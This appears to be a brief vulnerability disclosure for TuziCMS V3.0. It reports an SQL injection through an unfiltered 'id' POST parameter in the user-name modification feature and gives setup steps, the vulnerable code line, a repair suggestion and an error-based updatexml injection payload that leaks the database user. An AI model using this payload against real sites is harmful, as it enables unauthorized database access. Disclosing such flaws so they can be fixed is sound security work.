# tuzicms
Scope of influence
V3.0
Repair scheme
Filter parameter ID
Environment construction method
(1) : download from the official website and unzip it to the WWW directory, phpstudy, but the PHP version should be 5.3
Cause code vulnerabilities
$id=I('post.id');
Unfiltered
Vulnerability recurrence method
Click the user name modification menu
![image](https://user-images.githubusercontent.com/27337983/139573872-9201a74e-5c2b-4bef-8355-806d04b75187.png)


Start capturing bags
At parameter ID


Payload
user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)


![image](https://user-images.githubusercontent.com/27337983/139573881-0bfba88e-c9b6-49be-84f5-11a83c1f4a35.png)

